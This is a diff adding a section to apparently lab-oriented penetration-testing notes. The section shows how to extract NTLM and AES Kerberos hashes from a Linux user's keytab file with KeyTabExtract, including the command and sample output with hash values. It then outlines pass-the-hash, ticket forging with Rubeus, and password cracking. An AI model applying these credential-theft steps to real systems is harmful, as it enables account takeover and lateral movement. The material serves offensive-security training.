@@ -5011,6 +5011,37 @@ smbclient //dc01/carlos -k -c ls
 <details>
 <summary><h5>Option 2: Direct Access to Linux Account (Using Password)</h5></summary>
 
+We can use KeyTabExtract—a Python script—to extract data from version 0x502 .keytab files used for Kerberos authentication on Linux systems. This script can be found in its [GitHub repository](https://github.com/sosdave/KeyTabExtract) or [`here`](../scripts/passwords/keytabextract.py).
+
+* Realm
+* Service Principal
+* Encryption Types
+* Hashes (e.g. NTLM, AES-256, AES-128)
+
+Use KeyTabExtract to extract the info:
+
+```bash
+python3 ./keytabextract.py /opt/specialfiles/carlos.keytab 
+```
+
+```bash
+# [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+# [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+# [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+# [+] Keytab File successfully imported.
+#         REALM : <DOMAIN>
+#         SERVICE PRINCIPAL : carlos/
+#         NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+#         AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+#         AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+```
+
+With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
+
+> **Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
+
+The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as [crackstation](https://crackstation.net/), which contains billions of passwords.
+
 </details>
 
 </details>
